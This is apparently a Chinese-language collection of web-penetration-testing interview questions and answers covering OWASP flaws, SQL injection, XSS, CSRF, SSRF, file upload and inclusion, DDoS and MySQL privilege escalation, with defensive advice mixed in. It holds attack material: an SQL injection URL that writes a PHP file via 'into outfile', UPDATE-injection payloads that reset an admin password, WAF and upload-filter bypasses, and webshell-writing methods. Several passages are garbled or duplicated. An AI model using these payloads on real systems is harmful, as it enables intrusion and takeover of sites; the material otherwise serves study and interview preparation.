<p>详细：<a href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a> </p>
<h4 id="48、owasp-漏洞都有哪些？"><a href="#48、owasp-漏洞都有哪些？" class="headerlink" title="48、owasp 漏洞都有哪些？"></a>48、owasp 漏洞都有哪些？</h4><p>1）SQL 注⼊防护⽅法： </p>
<p>2）失效的身份认证和会话管理2）失效的身份认证和会话管理 </p>
<p>3）跨站脚本攻击 XSS </p>
<p>4）直接引⽤不安全的对象 </p>
<p>5）安全配置错误 </p>
<p>6）敏感信息泄露 </p>
<p>7）缺少功能级的访问控制 </p>
<p>8）跨站请求伪造 CSRF </p>
<p>9）使⽤含有已知漏洞的组件 </p>
<p>10）未验证的重定向和转发 </p>
<h4 id="49、SQL-注⼊防护⽅法？"><a href="#49、SQL-注⼊防护⽅法？" class="headerlink" title="49、SQL 注⼊防护⽅法？"></a>49、SQL 注⼊防护⽅法？</h4><p>1）使⽤安全的 API </p>
<p>2）对输⼊的特殊字符进⾏ Escape 转义处理 </p>
<p>3）使⽤⽩名单来规范化输⼊验证⽅法 </p>
<p>4）对客户端输⼊进⾏控制，不允许输⼊ SQL 注⼊相关的特殊字符 </p>
<p>5）服务器端在提交数据库进⾏ SQL 查询之前，对特殊字符进⾏过滤、转义、替换、删除。 </p>
<h4 id="50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？"><a href="#50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？" class="headerlink" title="50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？"></a>50、代码执⾏，⽂件读取，命令执⾏的函数都有哪些？</h4><p>1）代码执⾏：</p>
<p>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</p>
<p>2）⽂件读取：</p>
<p>file_get_contents(),highlight_file(),fopen(),read</p>
<p>file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</p>
<p>3)命令执⾏：</p>
<p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
<h4 id="51、img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？"><a href="#51、img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？" class="headerlink" title="51、img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？"></a>51、img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？</h4><p>src 指定⼀个远程的脚本⽂件，获取 referer52、img 标签除了 onerror 属性外，并且 src 属性的后缀名，必须以. jpg 结尾，怎么获取管理员路径。 </p>
<p>1）远程服务器修改 apache 配置⽂件，配置. jpg ⽂件以 php ⽅式来解析 AddType application/x-httpd-php .jpg &lt;img </p>
<p>src=<a href="http://xss.tv/1.jpg&gt;">http://xss.tv/1.jpg&gt;</a> 会以 php ⽅式来解析 </p>
<h4 id="53、为什么-aspx-⽊⻢权限⽐-asp-⼤？"><a href="#53、为什么-aspx-⽊⻢权限⽐-asp-⼤？" class="headerlink" title="53、为什么 aspx ⽊⻢权限⽐ asp ⼤？"></a>53、为什么 aspx ⽊⻢权限⽐ asp ⼤？</h4><p>aspx 使⽤的是. net 技术。IIS 中默认不⽀持，ASP 只是脚本语⾔⽽已。⼊侵的时候 asp 的⽊⻢⼀般是 guest 权限… </p>
<p>APSX 的⽊⻢⼀般是 users 权限。 </p>
<h4 id="54、如何绕过-waf？"><a href="#54、如何绕过-waf？" class="headerlink" title="54、如何绕过 waf？"></a>54、如何绕过 waf？</h4><p>⼤⼩写转换法 </p>
<p>⼲扰字符 /<em>!</em>/</p>
<p>编码 base64 unicode hex url ascll </p>
<p>复参数 </p>
<h4 id="55、如何向服务器写⼊-webshell？"><a href="#55、如何向服务器写⼊-webshell？" class="headerlink" title="55、如何向服务器写⼊ webshell？"></a>55、如何向服务器写⼊ webshell？</h4><p>各种上传漏洞</p>
<p>mysql具有写⼊权限,⽤sql语句写⼊shell</p>
<p>http put⽅法 </p>
<h4 id="56、渗透测试中常⻅的端⼝"><a href="#56、渗透测试中常⻅的端⼝" class="headerlink" title="56、渗透测试中常⻅的端⼝"></a>56、渗透测试中常⻅的端⼝</h4><p>a、web 类 (web 漏洞 / 敏感⽬录) 第三⽅通⽤组件漏洞 struts thinkphp jboss ganglia zabbix</p>
<p>80 web </p>
<p>80-89 web </p>
<p>8000-9090 web</p>
<p>b、数据库类 (扫描弱⼝令)1433 MSSQL </p>
<p>1521 Oracle </p>
<p>3306 MySQL </p>
<p>5432 PostgreSQL</p>
<p>c、特殊服务类 (未授权 / 命令执⾏类 / 漏洞)</p>
<p>443 SSL⼼脏滴⾎</p>
<p>873 Rsync未授权</p>
<p>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a> </p>
<p>6379 redis未授权</p>
<p>7001,7002 WebLogic默认弱⼝令，反序列</p>
<p>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞</p>
<p>11211 memcache未授权访问</p>
<p>27017,27018 Mongodb未授权访问</p>
<p>50000 SAP命令执⾏</p>
<p>50070,50030 hadoop默认端⼝未授权访问 </p>
<p>d、常⽤端⼝类 (扫描弱⼝令 / 端⼝爆破)</p>
<p>21 ftp </p>
<p>22 SSH </p>
<p>23 Telnet </p>
<p>2601,2604 zebra路由，默认密码zebra</p>
<p>3389 远程桌⾯ </p>
<h5 id="ALL、端⼝合计详情"><a href="#ALL、端⼝合计详情" class="headerlink" title="ALL、端⼝合计详情"></a>ALL、端⼝合计详情</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21 ftp </span><br><span class="line"></span><br><span class="line">22 SSH </span><br><span class="line"></span><br><span class="line">23 Telnet </span><br><span class="line"></span><br><span class="line">80 web </span><br><span class="line"></span><br><span class="line">80-89 web </span><br><span class="line"></span><br><span class="line">161 SNMP </span><br><span class="line"></span><br><span class="line">389 LDAP </span><br><span class="line"></span><br><span class="line">443 SSL⼼脏滴⾎以及⼀些web漏洞测试</span><br><span class="line"></span><br><span class="line">445 SMB 512,513,514 Rexec </span><br><span class="line"></span><br><span class="line">873 Rsync未授权</span><br><span class="line"></span><br><span class="line">1025,111 NFS </span><br><span class="line"></span><br><span class="line">1433 MSSQL </span><br><span class="line"></span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line"></span><br><span class="line">2082&#x2F;2083 cpanel主机管理系统登陆 （国外⽤较多）</span><br><span class="line"></span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外⽤较多）</span><br><span class="line"></span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line"></span><br><span class="line">3128 squid代理默认端⼝，如果没设置⼝令很可能就直接漫游内⽹了</span><br><span class="line"></span><br><span class="line">3306 MySQL </span><br><span class="line"></span><br><span class="line">3312&#x2F;3311 kangle主机管理系统登陆</span><br><span class="line"></span><br><span class="line">3389 远程桌⾯</span><br><span class="line"></span><br><span class="line">4440 rundeck 参考WooYun: 借⽤新浪某服务成功漫游新浪内⽹</span><br><span class="line"></span><br><span class="line">5432 PostgreSQL </span><br><span class="line"></span><br><span class="line">5900 vnc </span><br><span class="line"></span><br><span class="line">5984 CouchDB http:&#x2F;&#x2F;xxx:5984&#x2F;_utils&#x2F; </span><br><span class="line"></span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致⽹站被直接篡改或者作为代理进⼊内⽹</span><br><span class="line"></span><br><span class="line">6379 redis未授权</span><br><span class="line"></span><br><span class="line">7001,7002 WebLogic默认弱⼝令，反序列</span><br><span class="line"></span><br><span class="line">7778 Kloxo主机控制⾯板登录</span><br><span class="line"></span><br><span class="line">8000-9090 都是⼀些常⻅的web端⼝，有些运维喜欢把管理后台开在这些⾮80的端⼝上</span><br><span class="line"></span><br><span class="line">8080 tomcat&#x2F;WDCP主机管理系统，默认弱⼝令</span><br><span class="line"></span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line"></span><br><span class="line">8083 Vestacp主机管理系统 （国外⽤较多）</span><br><span class="line"></span><br><span class="line">8649 ganglia </span><br><span class="line"></span><br><span class="line">8888 amh&#x2F;LuManager 主机管理系统默认端⼝</span><br><span class="line"></span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执⾏漏洞</span><br><span class="line"></span><br><span class="line">10000 Virtualmin&#x2F;Webmin 服务器虚拟主机管理系统</span><br><span class="line"></span><br><span class="line">11211 memcache未授权访问</span><br><span class="line"></span><br><span class="line">27017,27018 Mongodb未授权访问</span><br><span class="line"></span><br><span class="line">28017 mongodb统计⻚⾯</span><br><span class="line"></span><br><span class="line">50000 SAP命令执⾏</span><br><span class="line"></span><br><span class="line">50070,50030 hadoop默认端⼝未授权访问 </span><br></pre></td></tr></table></figure>



<h3 id="三、深信服⼀⾯"><a href="#三、深信服⼀⾯" class="headerlink" title="三、深信服⼀⾯"></a>三、深信服⼀⾯</h3><p>了解哪些漏洞⽂件上传有哪些防护⽅式 </p>
<p>⽤什么扫描端⼝，⽬录 </p>
<p>如何判断注⼊ </p>
<p>注⼊有防护怎么办 </p>
<p>有没有写过 tamper </p>
<p>3306 1443 8080 是什么端⼝ </p>
<p>计算机⽹络从物理层到应⽤层 xxxx </p>
<p>有没有 web 服务开发经验 </p>
<p>如何向服务器写⼊ webshell </p>
<p>有没有⽤过 xss 平台 </p>
<p>⽹站渗透的流程 </p>
<p>mysql 两种提权⽅式（udf，？）</p>
<p>常⻅加密⽅式 xxx </p>
<p>ddos 如何防护 </p>
<p>有没有抓过包，会不会写 wireshark 过滤规则 </p>
<p>清理⽇志要清理哪些 </p>
<h4 id="四、SQL-注⼊防护"><a href="#四、SQL-注⼊防护" class="headerlink" title="四、SQL 注⼊防护"></a>四、SQL 注⼊防护</h4><p>1、使⽤安全的 API </p>
<p>2、对输⼊的特殊字符进⾏ Escape 转义处理 </p>
<p>3、使⽤⽩名单来规范化输⼊验证⽅法 </p>
<p>4、对客户端输⼊进⾏控制，不允许输⼊ SQL 注⼊相关的特殊字符 </p>
<p>5、服务器端在提交数据库进⾏ SQL 查询之前，对特殊字符进⾏过滤、转义、替换、删除。 </p>
<p>6、规范编码, 字符集 </p>
<h4 id="五、为什么参数化查询可以防⽌-SQL-注⼊"><a href="#五、为什么参数化查询可以防⽌-SQL-注⼊" class="headerlink" title="五、为什么参数化查询可以防⽌ SQL 注⼊"></a>五、为什么参数化查询可以防⽌ SQL 注⼊</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h5><p>使⽤参数化查询数据库服务器不会把参数的内容当作 sql 指令的⼀部分来执⾏，是在数据库完成 sql 指令的编译后才套 </p>
<p>⽤参数运⾏ </p>
<p>简单的说: 参数化能防注⼊的原因在于, 语句是语句，参数是参数，参数的值并不是语句的⼀部分，数据库只按语句的语 义跑</p>
<h4 id="六、SQL-头注⼊点"><a href="#六、SQL-头注⼊点" class="headerlink" title="六、SQL 头注⼊点"></a>六、SQL 头注⼊点</h4><p>UA</p>
<p>REFERER</p>
<p>COOKIE</p>
<p>IP</p>
<h4 id="七、盲注是什么？怎么盲注？"><a href="#七、盲注是什么？怎么盲注？" class="headerlink" title="七、盲注是什么？怎么盲注？"></a>七、盲注是什么？怎么盲注？</h4><p>盲注是在 SQL 注⼊攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在 SQL 注 </p>
<p>⼊和利⽤的⽅式。盲注的⼿段有两种，⼀个是通过⻚⾯的返回内容是否正确 (boolean-based)，来验证是否存在注⼊。</p>
<p>⼀个是通过 sql 语句处理时间的不同来判断是否存在注⼊ (time-based)，在这⾥，可以⽤ benchmark，sleep 等造成延 </p>
<p>时效果的函数，也可以通过构造⼤笛卡⼉积的联合查询表来达到延时的⽬的。 </p>
<h4 id="⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理"><a href="#⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理" class="headerlink" title="⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理"></a>⼋、宽字节注⼊产⽣原理以及根本原因1、产⽣原理</h4><p>在数据库使⽤了宽字符集⽽ WEB 中没考虑这个问题的情况下，在 WEB 层，由于 0XBF27 是两个字符，在 PHP 中⽐如 </p>
<p>addslash 和 magic_quotes_gpc 开启时，由于会对 0x27 单引号进⾏转义，因此 0xbf27 会变成 0xbf5c27, ⽽数据进⼊</p>
<p>数据库中时，由于 0XBF5C 是⼀个另外的字符，因此 \ 转义符号会被前⾯的 bf 带着 “吃掉”，单引号由此逃逸出来可以 </p>
<p>⽤来闭合语句。 </p>
<p>2、在哪⾥编码 </p>
<p>3、根本原因 </p>
<p>character_set_client(客户端的字符集) 和 character_set_connection(连接层的字符集) 不同, 或转换函数如，iconv、 </p>
<p>mb_convert_encoding 使⽤不当。 </p>
<p>4、解决办法 </p>
<p>统⼀数据库、Web 应⽤、操作系统所使⽤的字符集，避免解析产⽣差异，最好都设置为 UTF-8。或对数据进⾏正确的转 </p>
<p>义，如 mysql_real_escape_string+mysql_set_charset 的使⽤。 </p>
<p>5、SQL ⾥⾯只有 update 怎么利⽤ </p>
<p>先理解这句 SQL</p>
<p>UPDATE user SET password=’MD5($password)’, homepage=’$homepage’ WHERE id=’$id’</p>
<p>如果此 SQL 被修改成以下形式，就实现了注⼊ </p>
<p>a、修改 homepage 值为 <a href="http://xxx.net&#39;">http://xxx.net&#39;</a>, userlevel=’3</p>
<p>之后 SQL 语句变为UPDATE user SET password=’mypass’, homepage=’<a href="http://xxx.net&#39;">http://xxx.net&#39;</a>, userlevel=’3’ WHERE id=’$id’</p>
<p>userlevel 为⽤户级别 </p>
<p>b、修改 password 值为 mypass)’ WHERE username=’admin’#</p>
<p>之后 SQL 语句变为</p>
<p>UPDATE user SET password=’MD5(mypass)’ WHERE username=’admin’#)’, homepage=’$homepage’ WHERE id=’$id’</p>
<p>c、修改 id 值为 ‘ OR username=’admin’ 之后 SQL 语句变为</p>
<p>UPDATE user SET password=’MD5($password)’, homepage=’$homepage’ WHERE id=’’ OR username=’admin’</p>
<h4 id="九、SQL-如何写-shell-单引被过滤怎么办"><a href="#九、SQL-如何写-shell-单引被过滤怎么办" class="headerlink" title="九、SQL 如何写 shell / 单引被过滤怎么办"></a>九、SQL 如何写 shell / 单引被过滤怎么办</h4><p>写 shell: root 权限，GPC 关闭，知道⽂件路径 outfifile 函数</p>
<p>`<a href="http://127.0.0.1:81/sqli.php?id=1">http://127.0.0.1:81/sqli.php?id=1</a> into outfile ‘C:\wamp64\www\phpinfo.php’ FIELDS TERMINATED BY ‘&lt;?php phpinfo</p>
<p>(); ?&gt;’`</p>
<p>`<a href="http://127.0.0.1:81/sqli.php?id=-1">http://127.0.0.1:81/sqli.php?id=-1</a> union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile ‘C:\w</p>
<p>amp64\www\phpinfo.php’`</p>
<p>宽字节注⼊ </p>
<p>1、代替空格的⽅法</p>
<p>%0a、%0b、%a0 等</p>
<p>/**/ 等注释符</p>
<p>&lt;&gt;</p>
<p>2、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别 </p>
<p>5 0 以下没有 information schema 这个系统表 ⽆法列表名等 只能暴⼒跑表名。5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。 </p>
<p>5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操做。 </p>
<h4 id="⼗、XSS"><a href="#⼗、XSS" class="headerlink" title="⼗、XSS"></a>⼗、XSS</h4><p>1、XSS 原理 </p>
<p>反射型 </p>
<p>⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。需要诱使⽤户 “点击” ⼀个恶意链接，才能攻击 </p>
<p>成功</p>
<p>存储型 </p>
<p>存储型 XSS 会把⽤户输⼊的数据 “存储” 在服务器端。这种 XSS 具有很强的稳定性。 </p>
<p>DOM 型</p>
<p>通过修改⻚⾯的 DOM 节点形成的 XSS，称之为 DOM Based XSS。 </p>
<p>2、DOM 型和反射型的区别 </p>
<p>反射型 XSS：通过诱导⽤户点击，我们构造好的恶意 payload 才会触发的 XSS。反射型 XSS 的检测我们在每次请求带 </p>
<p>payload 的链接时⻚⾯应该是会带有特定的畸形数据的。DOM 型：通过修改⻚⾯的 DOM 节点形成的 XSS。DOM- </p>
<p>based XSS 由于是通过 js 代码进⾏ dom 操作产⽣的 XSS，所以在请求的响应中我们甚⾄不⼀定会得到相应的畸形数 </p>
<p>据。根本区别在我看来是输出点的不同。 </p>
<p>3、DOM 型和 XSS ⾃动化测试或⼈⼯测试 </p>
<p>⼈⼯测试思路：找到类似 document.write、innerHTML 赋值、outterHTML 赋值、window.location 操作、写 javascript: </p>
<p>后内容、eval、setTimeout 、setInterval 等直接执⾏之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经 </p>
<p>过安全函数。⾃动化测试参看道哥的博客，思路是从输⼊⼊⼿，观察变量传递的过程，最终检查是否有在危险函数输 </p>
<p>出，中途是否有经过安全函数。但是这样就需要有⼀个 javascript 解析器，否则会漏掉⼀些通过 js 执⾏带⼊的部分内</p>
<p>容容。</p>
<p>在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进⾏检测，对不同 </p>
<p>类型的 XSS 检测⽅式实际上并没有太过细分的标准化检测⽅式，所以回答的很烂。。。</p>
<p>4、如何快速发现 XSS 位置 </p>
<p>5、对于 XSS 怎么修补建议 </p>
<p>输⼊点检查：对⽤户输⼊的数据进⾏合法性检查，使⽤ fifilter 过滤敏感字符或对进⾏编码转义，针对特定类型数据进⾏格 </p>
<p>式检查。针对输⼊点的检查最好放在服务器端实现。 </p>
<p>输出点检查：对变量输出到 HTML ⻚⾯中时，对输出内容进⾏编码转义，输出在 HTML 中时，对其进⾏ </p>
<p>HTMLEncode，如果输出在 Javascript 脚本中时，对其进⾏ JavascriptEncode。对使⽤ JavascriptEncode 的变量都放 </p>
<p>在引号中并转义危险字符，data 部分就⽆法逃逸出引号外成为 code 的⼀部分。还可以使⽤更加严格的⽅法，对所有数</p>
<p>字字⺟之外的字符都使⽤⼗六进制编码。此外，要注意在浏览器中，HTML 的解析会优先于 Javascript 的解析，编码的</p>
<p>⽅式也需要考虑清楚，针对不同的输出点，我们防御 XSS 的⽅法可能会不同，这点可能在之后的⽂章会做下总结。 </p>
<p>除此之外，还有做 HTTPOnly 对 Cookie 劫持做限制。 </p>
<p>6、XSS 蠕⾍的⽣产条件 </p>
<p>正常情况下，⼀个是产⽣ XSS 点的⻚⾯不属于 self ⻚⾯，⽤户之间产⽣交互⾏为的⻚⾯，都可能造成 XSS Worm 的产 </p>
<p>⽣。</p>
<p>不⼀定需要存储型 XSS </p>
<h4 id="⼗⼀、CSRF"><a href="#⼗⼀、CSRF" class="headerlink" title="⼗⼀、CSRF"></a>⼗⼀、CSRF</h4><p>1、CSRF 原理 </p>
<p>CSRF 是跨站请求伪造攻击，由客户端发起, 是由于没有在关键操作执⾏时进⾏是否由⽤户⾃愿发起的确认 </p>
<p>2、防御验证 Referer </p>
<p>添加 token </p>
<p>3、token 和 referer 做横向对⽐，谁安全等级⾼？ </p>
<p>token 安全等级更⾼，因为并不是任何服务器都可以取得 referer，如果从 HTTPS 跳到 HTTP，也不会发送 referer。并 </p>
<p>且 FLASH ⼀些版本中可以⾃定义 referer。但是 token 的话，要保证其⾜够随机且不可泄露。(不可预测性原则) </p>
<p>4、对 referer 的验证，从什么⻆度去做？如果做，怎么杜绝问题</p>
<p>对 header 中的 referer 的验证，⼀个是空 referer，⼀个是 referer 过滤或者检测不完善。为了杜绝这种问题，在验证的 </p>
<p>⽩名单中，正则规则应当写完善。 </p>
<p>5、针对 token, 对 token 测试会注意哪⽅⾯被⼈，会对 token 的哪⽅⾯进⾏测试？ </p>
<p>引⽤⼀段请教前辈的回答： </p>
<p>针对token的攻击，⼀是对它本身的攻击，重放测试⼀次性、分析加密规则、校验⽅式是否正确等，⼆是结合信息泄露漏洞对它的获取，结合着发起组合攻击 </p>
<p>信息泄露有可能是缓存、⽇志、get，也有可能是利⽤跨站 </p>
<p>很多跳转登录的都依赖token，有⼀个跳转漏洞加反射型跨站就可以组合成登录劫持了 </p>
<p>另外也可以结合着其它业务来描述token的安全性及设计不好怎么被绕过⽐如抢红包业务之类的 </p>
<h4 id="⼗二、SSRF"><a href="#⼗二、SSRF" class="headerlink" title="⼗二、SSRF"></a>⼗二、SSRF</h4><p>SSRF(Server-Side Request Forgery: 服务器端请求伪造) 是⼀种由攻击者构造形成由服务端发起请求的⼀个安全漏洞。 </p>
<p>⼀般情况下，SSRF 攻击的⽬标是从外⽹⽆法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它 </p>
<p>相连⽽与外⽹隔离的内部系统） </p>
<p>SSRF 形成的原因⼤都是由于服务端提供了从其他服务器应⽤获取数据的功能且没有对⽬标地址做过滤与限制。⽐如从指 </p>
<p>定 URL 地址获取⽹⻚⽂本内容，加载指定地址的图⽚，下载等等。 </p>
<p>1、监测SSRF 漏洞的验证⽅法： </p>
<p>1）因为 SSRF 漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送 </p>
<p>的，从⽽来判断是否存在 SSRF 漏洞 </p>
<p>2）在⻚⾯源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=（地址）的就可能存">www.baidu.com/xxx.php?image=（地址）的就可能存</a> 在 SSRF 漏洞 </p>
<p>2、SSRF 漏洞的成因 防御 绕过 </p>
<p>成因：模拟服务器对其他服务器资源进⾏请求，没有做合法性验证。利⽤：构造恶意内⽹ IP 做探测，或者使⽤其余所⽀ </p>
<p>持的协议对其余服务进⾏攻击。防御：禁⽌跳转，限制协议，内外⽹限制，URL 限制。绕过：使⽤不同协议，针对 IP， </p>
<p>IP 格式的绕过，针对 URL，恶意 URL 增添其他字符，@之类的。301 跳转 + dns rebindding。 </p>
<h4 id="⼗三、上传"><a href="#⼗三、上传" class="headerlink" title="⼗三、上传"></a>⼗三、上传</h4><h5 id="1、⽂件上传漏洞原理"><a href="#1、⽂件上传漏洞原理" class="headerlink" title="1、⽂件上传漏洞原理"></a>1、⽂件上传漏洞原理</h5><p>由于程序员在对⽤户⽂件上传部分的控制不⾜或者处理缺陷，⽽导致⽤户可以越过其本身权限向服务器上传可执⾏的动 </p>
<p>态脚本⽂件 </p>
<h5 id="2、常⻅的上传绕过⽅式"><a href="#2、常⻅的上传绕过⽅式" class="headerlink" title="2、常⻅的上传绕过⽅式"></a>2、常⻅的上传绕过⽅式</h5><p>前端 js 验证：禁⽤ js/burp 改包 </p>
<p>⼤⼩写 </p>
<p>双重后缀名 </p>
<p>过滤绕过 pphphp-&gt;php </p>
<h5 id="3、防护⽂件上传⽬录设置为不可执⾏"><a href="#3、防护⽂件上传⽬录设置为不可执⾏" class="headerlink" title="3、防护⽂件上传⽬录设置为不可执⾏"></a>3、防护⽂件上传⽬录设置为不可执⾏</h5><p>使⽤⽩名单判断⽂件上传类型 </p>
<p>⽤随机数改写⽂件名和路径 </p>
<h5 id="4、审查上传点的元素有什么意义？"><a href="#4、审查上传点的元素有什么意义？" class="headerlink" title="4、审查上传点的元素有什么意义？"></a>4、审查上传点的元素有什么意义？</h5><p>有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 </p>
<h4 id="⼗四、⽂件包含"><a href="#⼗四、⽂件包含" class="headerlink" title="⼗四、⽂件包含"></a>⼗四、⽂件包含</h4><h5 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h5><p>引⼊⼀段⽤户能控制的脚本或代码，并让服务器端执⾏ include() 等函数通过动态变量的⽅式引⼊需要包含的⽂件； </p>
<p>⽤户能够控制该动态变量。 </p>
<h5 id="2、导致⽂件包含的函数"><a href="#2、导致⽂件包含的函数" class="headerlink" title="2、导致⽂件包含的函数"></a>2、导致⽂件包含的函数</h5><p>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfifile(), … JSP/Servlet：ava.io.File(), </p>
<p>java.io.Fil-eReader(), … ASP：include fifile, include virtual, </p>
<h5 id="3、本地⽂件包含"><a href="#3、本地⽂件包含" class="headerlink" title="3、本地⽂件包含"></a>3、本地⽂件包含</h5><p>能够打开并包含本地⽂件的漏洞，被称为本地⽂件包含漏洞 </p>
<h4 id="⼗五、逻辑漏扫"><a href="#⼗五、逻辑漏扫" class="headerlink" title="⼗五、逻辑漏扫"></a>⼗五、逻辑漏扫</h4><h5 id="1、⾦融⾏业常⻅逻辑漏洞"><a href="#1、⾦融⾏业常⻅逻辑漏洞" class="headerlink" title="1、⾦融⾏业常⻅逻辑漏洞"></a>1、⾦融⾏业常⻅逻辑漏洞</h5><p>单针对⾦融业务的 主要是数据的篡改 (涉及⾦融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅⽺ </p>
<p>⽑，交易 / 订单信息泄露，⽔平越权对别⼈的账户查看或恶意操作，交易或业务步骤绕过。 </p>
<h4 id="⼗五、中间⼈攻击"><a href="#⼗五、中间⼈攻击" class="headerlink" title="⼗五、中间⼈攻击"></a>⼗五、中间⼈攻击</h4><p>中间 攻 （缺 ） 的攻 客户 与 务 之间在 的 中缺 造成的中间⼈攻击是⼀个（缺乏）相互认证的攻击；由于客户端与服务器之间在 SSL 握⼿的过程中缺乏相互认证⽽造成的漏洞 </p>
<p>防御中间⼈攻击的⽅案通常基于⼀下⼏种技术 </p>
<ol>
<li>公钥基础建设 PKI 使⽤ PKI 相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例⼦中都是只验证服务 </li>
</ol>
<p>器，这样就造成了 SSL 握⼿环节的漏洞，⽽如果使⽤相互认证的的话，基本可以更强⼒的相互认证</p>
<ol start="2">
<li>延迟测试 </li>
</ol>
<p>使⽤复杂加密哈希函数进⾏计算以造成数⼗秒的延迟；如果双⽅通常情况下都要花费 20 秒来计算，并且整个通讯花费 </p>
<p>了 60 秒计算才到达对⽅，这就能表明存在第三⽅中间⼈。 </p>
<ol start="3">
<li>使⽤其他形式的密钥交换形式</li>
</ol>
<h5 id="ARP-欺骗"><a href="#ARP-欺骗" class="headerlink" title="ARP 欺骗"></a>ARP 欺骗</h5><p>原理</p>
<p>每台主机都有⼀个 ARP 缓存表，缓存表中记录了 IP 地址与 MAC 地址的对应关系，⽽局域⽹数据传输依靠的是 MAC</p>
<p>地址。在 ARP 缓存表机制存在⼀个缺陷，就是当请求主机收到 ARP 应答包后，不会去验证⾃⼰是否向对⽅主机发送过</p>
<p>ARP 请求包，就直接把这个返回包中的 IP 地址与 MAC 地址的对应关系保存进 ARP 缓存表中，如果原有相同 IP 对应关 </p>
<p>系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能 </p>
<p>防护</p>
<ol>
<li><p>在主机绑定⽹关 MAC 与 IP 地址为静态（默认为动态），命令：arp -s ⽹关 IP ⽹关 MAC </p>
</li>
<li><p>在⽹关绑定主机 MAC 与 IP 地址</p>
</li>
<li><p>使⽤ ARP 防⽕墙 </p>
</li>
</ol>
<h4 id="⼗六、DDOS1、DDOS-原理"><a href="#⼗六、DDOS1、DDOS-原理" class="headerlink" title="⼗六、DDOS1、DDOS 原理"></a>⼗六、DDOS1、DDOS 原理</h4><p>利⽤合理的请求造成资源过载，导致服务不可⽤ </p>
<h5 id="syn-洪流的原理"><a href="#syn-洪流的原理" class="headerlink" title="syn 洪流的原理"></a>syn 洪流的原理</h5><p>伪造⼤量的源 IP 地址，分别向服务器端发送⼤量的 SYN 包，此时服务器端会返回 SYN/ACK 包，因为源地址是伪造 </p>
<p>的，所以伪造的 IP 并不会应答，服务器端没有收到伪造 IP 的回应，会重试 3～5 次并且等待⼀个 SYNTime（⼀般为 </p>
<p>30 秒⾄ 2 分钟），如果超时则丢弃这个连接。攻击者⼤量发送这种伪造源地址的 SYN 请求，服务器端将会消耗⾮常多 </p>
<p>的资源（CPU 和内存）来处理这种半连接，同时还要不断地对这些 IP 进⾏ SYN+ACK 重试。最后的结果是服务器⽆暇 </p>
<p>理睬正常的连接请求，导致拒绝服务。 </p>
<h5 id="CC-攻击原理"><a href="#CC-攻击原理" class="headerlink" title="CC 攻击原理"></a>CC 攻击原理</h5><p>对⼀些消耗资源较⼤的应⽤⻚⾯不断发起正常的请求，以达到消耗服务端资源的⽬的。 </p>
<p>2、DOSS 防护 </p>
<p>SYN Cookie/SYN Proxy、safereset 等算法。SYN Cookie 的主要思想是为每⼀个 IP 地址分配⼀个 “Cookie”，并统计每 </p>
<p>个 IP 地址的访问频率。如果在短时间内收到⼤量的来⾃同⼀个 IP 地址的数据包，则认为受到攻击，之后来⾃这个 IP 地 </p>
<p>址的包将被丢弃。 </p>
<h4 id="⼗七、提权"><a href="#⼗七、提权" class="headerlink" title="⼗七、提权"></a>⼗七、提权</h4><p>MySQL 两种提权⽅式 </p>
<p>udf 提权, mof 提权 </p>
<p>MySQL_UDF 提取 </p>
<p>要求: 1. ⽬标系统是 Windows(Win2000,XP,Win2003)；2. 拥有 MYSQL 的某个⽤户账号，此账号必须有对 mysql 的 </p>
<p>insert 和 delete 权限以创建和抛弃函数 3. 有 root 账号密码 导出 udf: MYSQL 5.1 以上版本，必须要把 udf.dll ⽂件放到 </p>
<p>安装⽬录 的 \ ⽂件夹 才能创建⾃定义函数 以再 ⾥输⼊MYSQL 安装⽬录下的 lib\plugin ⽂件夹下才能创建⾃定义函数 可以再 mysql ⾥输⼊ select @@basedir show variables</p>
<p>like ‘%plugins%’ 寻找 mysql 安装路径 提权: </p>
